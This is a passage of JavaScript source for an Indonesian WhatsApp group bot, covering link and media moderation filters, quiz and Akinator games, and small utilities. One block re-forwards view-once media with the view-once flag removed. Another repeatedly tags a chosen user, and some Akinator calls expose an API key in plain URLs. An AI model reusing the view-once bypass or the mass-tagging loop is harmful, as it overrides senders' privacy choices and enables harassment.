        const report = `Laporan Bug Hunting untuk ${url}:\nStatus: ${status}\nTipe Konten: ${contentType}\nCek Sumber Tidak Aman\n${insecureResources.join('\n')}\nFormulir Tanpa Atribut Aman\n${formsWithoutSecure.length} formulir tanpa atribut "method" yang aman`;

        return report;
    } catch (error) {
        throw 'Gagal melakukan Bug Hunting.';
    }
}
// Function to fetch quotes from URL
function quotes(input) {
    return new Promise((resolve, reject) => {
        fetch('https://jagokata.com/kata-bijak/kata-' + input.replace(/\s/g, '_') + '.html?page=1')
            .then(res => res.text())
            .then(res => {
                const $ = cheerio.load(res);
                data = [];
                $('div[id="main"]').find('ul[id="citatenrijen"] > li').each(function (index, element) {
                    x = $(this).find('div[class="citatenlijst-auteur"] > a').text().trim();
                    y = $(this).find('span[class="auteur-beschrijving"]').text().trim();
                    z = $(element).find('q[class="fbquote"]').text().trim();
                    data.push({ author: x, bio: y, quote: z });
                });
                data.splice(2, 1);
                if (data.length == 0) return resolve({ creator: '@neoxr - Wildan Izzudin & @ariffb.id - Ariffb', status: false });
                resolve({ creator: '@skyyyy', status: true, data });
            }).catch(reject);
    });
}
async function getIpInfo(ip) {
    try {
        const response = await axios.get(`https://ipinfo.io/${ip}/json`);
        return response.data;
    } catch (error) {
        throw 'Gagal mendapatkan informasi IP.';
    }
}
const replygc = (teks) => {
    sky.sendMessage(from, { 
        text: teks, 
        contextInfo: {
            mentionedJid: [],
            groupMentions: [],
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '0@newsletter',
                newsletterName: "avosky-md",
                serverMessageId: -1
            },
            forwardingScore: 256,
            externalAdReply: {
                showAdAttribution: true,
                title: `avoskh-md`,
                body: `alaaaaooooooo`,
                thumbnailUrl: `avosky.com`,
                sourceUrl: "https://wa.me/33451220170",
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m })
}
	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await sky.updateProfileStatus(`${sky.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
	async function waitForMessage(from, regex, timeout) {
    return new Promise(async (resolve) => {
        const startTime = Date.now();

        while (Date.now() - startTime < timeout) {
            const messages = await sky.sendMessage(m.chat, { fromMe: false })
            
            for (const message of messages) {
                if (message.sender === from && regex.test(message.content)) {
                    resolve(message);
                    return;
                }
            }

            await new Promise(resolve => setTimeout(resolve, 1000)); // Tunggu selama 1 detik sebelum cek kembali
        }

        resolve(null); // Timeout tercapai
    });
}
/**
let caseNames = getCaseNames();

function getCaseNames() {   
    try {
        // Baca kedua file 'sky.js' dan 'sky2.js'
        const data1 = fs.readFileSync('sky.js', 'utf8');
        const data2 = fs.readFileSync('sky2.js', 'utf8');

        // Gabungkan konten dari kedua file
        const combinedData = data1 + '\n' + data2;

        // Pola untuk menemukan case
        const casePattern = /case\s+'([^']+)'/g;
        const matches = combinedData.match(casePattern);

        if (matches) {
            // Ekstrak nama case
            const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
            return caseNames;
        } else {
            return [];
        }
    } catch (err) {
        console.log('Terjadi kesalahan:', err);
        return [];
    }
}

if (command) { // Tanpa pengecekan prefix
    let Prefix = command.trim(); // Hilangkan spasi berlebih
    let mean = didyoumean(Prefix, caseNames);
    let sim = similarity(Prefix, mean);
    let similarityPercentage = parseInt(sim * 100);

    if (mean && Prefix.toLowerCase() !== mean.toLowerCase()) {
        let response = `_tidak ada kode case seperti itu apakah case yang kamu cari_:\n\n> _${mean}_\n> _Presentasi: ${similarityPercentage}%_`;
        m.reply(response);
    }
}
**/
function formatSize(bytes) {
  if (bytes === 0) return '0 Bytes';
  const k = 1024;
  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function sizeLimit(size, limit) {
  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
  const limitSize = parseFloat(limit);
  const limitUnit = limit.replace(/[\d.]/g, '');
  const limitIndex = sizes.findIndex(unit => unit === limitUnit);
  const currentSize = parseFloat(size);
  const currentUnit = size.replace(/[\d.]/g, '');
  const currentIndex = sizes.findIndex(unit => unit === currentUnit);

  if (currentIndex > limitIndex) {
    return {
      oversize: true,
      currentSize: currentSize,
      currentUnit: currentUnit,
      limitSize: limitSize,
      limitUnit: limitUnit
    };
  } else {
    return {
      oversize: false,
      currentSize: currentSize,
      currentUnit: currentUnit,
      limitSize: limitSize,
      limitUnit: limitUnit
    };
  }
}

function jsonformat(json) {
  return JSON.stringify(json, null, 2);
}
async function replyprem(teks) {
    m.reply(`sorry fitur ini hanya untuk premium only jika ingin premium bisa ketik .buyprem`)
}	
async function sendNextTag(user) {
  if (tagQueue[user] && tagQueue[user].currentIndex < tagQueue[user].amount) {
    const target = tagQueue[user].target;
    const currentIndex = tagQueue[user].currentIndex;

    // Mengirim tag berikutnya
    sky.sendTextWithMentions(from, `${target}`);
    
    // Menambahkan 1 ke currentIndex dan menjalankan pengiriman tag selanjutnya setelah jeda
    tagQueue[user].currentIndex++;
    setTimeout(() => {
      sendNextTag(user);
    }, 1000); // Jeda 1 detik
  } else {
    // Menghapus antrian tag setelah selesai
    delete tagQueue[user];
  }
}  
// Fungsi untuk mengacak urutan elemen dalam array
function shuffleArray(array) {
  const shuffled = [...array];
  for (let i = shuffled.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
  }
  return shuffled;
}
function drawCard() {
    const cards = ['A', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K'];
    const randomIndex = Math.floor(Math.random() * cards.length);
    return cards[randomIndex];
}

function calculateScore(hand) {
    let score = 0;
    let numOfAces = 0;

    for (let card of hand) {
        if (card === 'A') {
            numOfAces++;
            score += 11;
        } else if (['K', 'Q', 'J'].includes(card)) {
            score += 10;
        } else {
            score += parseInt(card);
        }
    }

    while (numOfAces > 0 && score > 21) {
        score -= 10;
        numOfAces--;
    }

    return score;
}

	        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await sky.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await sky.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
    if (antiEmote) {
    if (emojiRegex.test(budy)) {
        if (!isBotAdmins) return
bcl = `Admin Bebas Emoji`
if (isAdmins) return m.reply(bcl)
if (m.key.fromMe) return m.reply(bcl)
kice = m.sender
            await sky.sendMessage(m.chat, {
               delete: {
                  remoteJid: m.chat,
                  fromMe: false,
                  id: m.key.id,
                  participant: m.key.participant
               }
            })             	
sky.sendMessage(from, {text:`Sorry ${pushname} No Emoji here `, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
}
           if (SimiActive) {
 const languageCode = 'id';
 const simsimiKey = ''; 
 fetch('https://api.simsimi.vn/v1/simtalk', {
 method: 'POST',
 headers: {
 'Content-Type': 'application/x-www-form-urlencoded'
 },
 body: `text=hm ${encodeURIComponent(text)}&lc=${languageCode}&key=${simsimiKey}`
 })
 .then(response => response.json())
 .then(data => {
 const simsimiResponse = data.message;
 const replyText = `${simsimiResponse}`;
 sky.sendMessage(m.chat, { text: replyText }, { quoted: m });
 })
 .catch(error => {
 console.error('Error:', error);
 m.reply('Terjadi kesalahan saat mencoba berkomunikasi dengan SimSimi.');
 });
 }
    if (bocet) {
if (isGroup && bocet && !isPrem && !itsMe && !isCreator) return 
}
         if (AntiBatu)
         if (budy.match("🗿")) {
         if (!isBotAdmins) return
bcl = `「 Admin Kan Bebas 🗿 」 `
if (isAdmins) return m.reply(bcl)
if (m.key.fromMe) return m.reply(bcl)
kice = m.sender
            await sky.sendMessage(m.chat, {
               delete: {
                  remoteJid: m.chat,
                  fromMe: false,
                  id: m.key.id,
                  participant: m.key.participant
               }
            })             	
sky.sendMessage(from, {text:`\`\`\`「 🗿 Detected 」\`\`\`\n\n@${kice.split("@")[0]} His Anti Stone Message Has Been Deleted`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
 // Antiwame by xeon
  if (antiWame)
  if (budy.includes("wa.me","Wa.me")) {
if (!isBotAdmins) return 
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
kice = m.sender
        await sky.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			sky.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
sky.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
         //Anti Link Push kontakV1
        if (db.data.chats[m.chat].antipushkontakv1) {
            if (budy.match(`pushkontak`)) {
                m.reply(`「 ANTI PUSH KONTAK 」\n\nKamu Terdeteksi Sedang Push kontak, Anak Yatim Lagi Push kontak 😂 !`)
                if (!isBotAdmins) return m.reply(`Ehh Bot Gak Admin T_T`)
                if (isAdmins) return m.reply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return m.reply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                sky.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
        //SKYY
     //Anti Promosi
        if (db.data.chats[m.chat].antipushkontakv2) {
            if (budy.match(`panel`)) {
                m.reply(`「 ANTI PROMOSI 」\n\nKamu Terdeteksi Sedang Promosi, Anak Yatim Lagi Promosi 😂 !`)
                if (!isBotAdmins) return m.reply(`Ehh Bot Gak Admin T_T`)
                if (isAdmins) return m.reply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return m.reply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                sky.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
// Anti Link
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return mess.botAdmin
        let gclink = (`https://chat.whatsapp.com/`+await sky.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return sky.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`})
        if (isAdmins) return sky.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`})
        
        kice = m.sender
        await sky.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			sky.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			sky.sendMessage(from, {text:`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending group link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }
//antivirtex by xeon
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return mess.botAdmin
          await sky.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			sky.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			sky.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words by xeon
if (antiToxic)
if (BadXeon.includes(messagesD)) {
if (m.text) {
bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin/owner that's why i won't kick you😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
        await sky.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			await sky.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
sky.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
}
// anti saluran
if (
    db.data.chats[m.chat].anticallog && // Cek apakah fitur anticallog aktif
    m.isGroup && // Pastikan pesan dikirim di grup
    m.mtype === 'CallLogMessage' // Cek apakah pesan berisi extendedTextMessage (biasanya berisi tautan atau pesan panjang)
) {
    // Cek apakah pengirim adalah admin
    if (isAdmins) {
        let bvl = `_Admin Is Free Call_`; // Pesan untuk admin
        return m.reply(bvl); // Admin bebas mengirim extendedTextMessage
    }

    // Hapus pesan extendedTextMessage jika bukan admin
    await sky.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant
        }
    });
}
// anti media
if (
    db.data.chats[m.chat].antimedia && // Cek apakah fitur antimedia aktif
    m.isGroup && // Pastikan pesan dikirim di grup
    (m.mtype === 'imageMessage' || m.mtype === 'videoMessage' || m.mtype === 'audioMessage') // Cek apakah pesan berisi foto, video, atau audio
) {
    // Cek apakah pengirim adalah admin
    if (isAdmins) {
        let bvl = `_Admin Is Free To Send All Media_`; // Pesan untuk admin
        return m.reply(bvl); // Admin bebas mengirim media
    }

    // Hapus hanya pesan yang bertipe imageMessage, videoMessage, atau audioMessage jika bukan admin
    await sky.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant
        }
    });
}
//antipoll
if (
    db.data.chats[m.chat].antipoll && // Cek apakah fitur antipoll aktif
    m.isGroup && // Pastikan pesan dikirim di grup
    m.mtype === 'pollCreationMessageV3' // Pastikan tipe pesan adalah eventMessage
) {
    // Pastikan hanya menghapus pesan yang bertipe eventMessage
    await sky.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant
        }
    });
}
if (
    db.data.chats[m.chat].antievent && // Cek apakah fitur antipoll aktif
    m.isGroup && // Pastikan pesan dikirim di grup
    m.mtype === 'eventMessage' // Pastikan tipe pesan adalah eventMessage
) {
    // Pastikan hanya menghapus pesan yang bertipe eventMessage
    await sky.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant
        }
    });
}
if (
    db.data.chats[m.chat].antichat && // Cek apakah fitur antichat aktif
    m.isGroup && // Pastikan pesan dikirim di grup
    m.mtype === 'conversation' // Cek apakah pesan berisi teks
) {
    // Jika pengirim bukan admin, hapus pesan teks
    if (!isAdmins) {
        await sky.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant
            }
        });
    }
}
//antiView
if (
    db.data.chats[m.chat].antiviewonce && 
    m.isGroup && 
    (m.mtype === 'viewOnceMessageV2' || m.mtype === 'viewOnceMessageV2Extension')
) {
    let skuy = { ...m };
    let msg = skuy.message?.viewOnceMessage?.message || 
              skuy.message?.viewOnceMessageV2?.message ||
              skuy.message?.viewOnceMessageV2Extension?.message;
    delete msg[Object.keys(msg)[0]].viewOnce;
    skuy.message = msg;
    await sky.sendMessage(m.chat, { forward: skuy }, { quoted: m });
}
//antilink youtube video by xeon
if (AntiLinkYt)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
        await sky.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			sky.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
sky.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink instagram by xeon
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
        await sky.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			sky.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
sky.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by xeon
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
        await sky.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			sky.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
sky.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by xeon
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
        await sky.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			sky.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
sky.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending telegram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by xeon
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/","https://vt.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
        await sky.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			sky.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
sky.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending tiktok link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}        
//antilink twitter by xeon
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
        await sky.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			sky.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
sky.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending twitter link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
 // Akinator Setting Start
 
	if (akinator.hasOwnProperty(m.sender.split('@')[0]) && isCmd && ["0", "1", "2", "3", "4", "5"].includes(body)) {
                kuis = true
                var { server, frontaddr, session, signature, question, step } = akinator[m.sender.split('@')[0]]
                if (step == "0" && budy == "5") throw("Maaf Anda telah mencapai pertanyaan pertama")
                var ini_url = `https://api.lolhuman.xyz/api/akinator/answer?apikey=Gata_Dios&server=${server}&frontaddr=${frontaddr}&session=${session}&signature=${signature}&answer=${budy}&step=${step}`
                var get_result = await fetchJson(ini_url)
                var get_result = get_result.result
                if (get_result.hasOwnProperty("name")) {
                    var ini_name = get_result.name
                    var description = get_result.description
                    ini_txt = `${ini_name} - ${description}\n\n`
                    ini_txt += "Apakah Tebakan Saya Benar? Tuan/Nyonya\n\nSekian dan terima gaji. Akinator by Avosky-MD"
                    await sky.sendImage(m.chat, get_result.image, ini_txt, m).then(() => {
                        delete akinator[m.sender.split('@')[0]]
                        fs.writeFileSync("./src/akinator.json", JSON.stringify(akinator))
                    })
                    return
                }
                var { question, _, step } = get_result
                ini_txt = `🤔🤔\n${question}\n\n`
                ini_txt += "0 - Ya\n"
                ini_txt += "1 - Tidak\n"
                ini_txt += "2 - Saya Tidak Tau\n"
                ini_txt += "3 - Mungkin\n"
                ini_txt += "4 - Mungkin Tidak\n"
                ini_txt += "5 - Kembali ke Pertanyaan Sebelumnya"
                if (args[0] === '5') {
                    var ini_url = `https://api.lolhuman.xyz/api/akinator/back?apikey=Gata_Dios&server=${server}&frontaddr=${frontaddr}&session=${session}&signature=${signature}&answer=${budy}&step=${step}`
                    var get_result = await fetchJson(ini_url)
                    var get_result = get_result.result
                    var { question, _, step } = get_result
                    ini_txt = `🤔🤔\n${question}\n\n`
                    ini_txt += "0 - Ya\n"
                    ini_txt += "1 - Tidak\n"
                    ini_txt += "2 - Saya Tidak Tau\n"
                    ini_txt += "3 - Mungkin\n"
                    ini_txt += "4 - Mungkin Tidak"
                    ini_txt += "5 - Kembali ke Pertanyaan Sebelumnya"
                }
                sky.sendText(m.chat, ini_txt, m).then(() => {
                    const data_ = akinator[m.sender.split('@')[0]]
                    data_["question"] = question
                    data_["step"] = step
                    akinator[m.sender.split('@')[0]] = data_
                    fs.writeFileSync("./src/akinator.json", JSON.stringify(akinator))
                })
            }
			
 // Akinator settings end
//antilink all by xeon
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
        await sky.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			sky.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
sky.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: sky.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, sky.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        sky.ev.emit('messages.upsert', msg)
        }
// GAME 
function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function formatNumber(number) {
  return number.toLocaleString();
}

// Panggil fungsi handleBombGame di tempat yang sesuai dalam handler pesan bot Anda.
	    
 
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            sky.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }
        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nAnda mendapatkan hadiah sebesar ${hadiah} balance.`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                    const hadiahMin = 1;
        const hadiahMax = 20000;
        const hadiah = Math.floor(Math.random() * (hadiahMax - hadiahMin + 1)) + hadiahMin;

        db.data.users[m.sender].balance += hadiah;
                await m.reply(`🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nJawaban Benar 🎉\n\nAnda mendapatkan hadiah sebesar ${hadiah} balance`)
                delete tebakgambar[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }        					
if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
    kuis = true
    jawaban = tebakkata[m.sender.split('@')[0]]
    if (budy.toLowerCase() == jawaban) {
        const hadiahMin = 1;
        const hadiahMax = 20000;
        const hadiah = Math.floor(Math.random() * (hadiahMax - hadiahMin + 1)) + hadiahMin;

        db.data.users[m.sender].balance += hadiah; // Tambahkan hadiah ke balance pengguna
        await m.reply(`🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nAnda mendapatkan hadiah sebesar ${hadiah} balance.`);
        delete tebakkata[m.sender.split('@')[0]];
    } else {
        m.reply('*Jawaban Salah!*');
    }
}
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
    kuis = true
    jawaban = tebakbendera[m.sender.split('@')[0]]
    if (budy.toLowerCase() == jawaban) {
        const hadiahMin = 1;
        const hadiahMax = 20000;
        const hadiah = Math.floor(Math.random() * (hadiahMax - hadiahMin + 1)) + hadiahMin;

        db.data.users[m.sender].balance += hadiah; // Tambahkan hadiah ke balance pengguna
        await m.reply(`🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉\n\nAnda mendapatkan hadiah sebesar ${hadiah} balance.`);
        delete tebakbendera[m.sender.split('@')[0]];
    } else {
        m.reply('*Jawaban Salah!*');
    }
}
        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                    const hadiahMin = 1;
        const hadiahMax = 20000;
        const hadiah = Math.floor(Math.random() * (hadiahMax - hadiahMin + 1)) + hadiahMin;

        db.data.users[m.sender].balance += hadiah; // Tambahkan hadiah ke balance pengguna
                await m.reply(`🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n\nAnda mendapatkan hadiah sebesar ${hadiah} balance.`)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                    const hadiahMin = 1;
        const hadiahMax = 20000;
        const hadiah = Math.floor(Math.random() * (hadiahMax - hadiahMin + 1)) + hadiahMin;

        db.data.users[m.sender].balance += hadiah; // Tambahkan hadiah ke balance pengguna
